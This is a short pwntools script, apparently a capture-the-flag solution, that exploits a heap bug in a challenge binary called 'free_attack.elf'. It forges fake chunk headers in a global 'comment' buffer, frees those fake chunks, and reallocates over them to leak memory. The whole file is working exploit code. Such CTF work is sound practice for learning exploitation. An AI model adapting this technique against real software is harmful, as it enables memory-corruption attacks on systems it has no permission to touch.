from pwn import *

context.log_level = 'debug'

target = ELF('./free_attack.elf')

def add_name(size, name):
    r.sendlineafter('> ', '1')
    r.sendlineafter('Size: ', str(size))
    r.sendlineafter('Name: ', name)

def delete_name(addr):
    r.sendlineafter('> ', '2')
    r.sendlineafter('Addr: ', hex(addr)[2:])

r = process("./free_attack.elf")#remote('153.125.224.83', 14848)

r.sendlineafter('note:', (p64(0) + p64(0x31)) * 2 + '\x00' * 0x10 + (p64(0) + p64(0x31)) * 3)
delete_name(target.symbols['comment'] + 0x20)
delete_name(target.symbols['comment'] + 0x10)
add_name(0x20, p64(0) + p64(0x31) + p64(target.symbols['comment'] + 0x50))
add_name(0x20, '')
add_name(0x20, 'A' * 0x20)

r.recvuntil('Name: ')
print r.recvline()[0x20:]

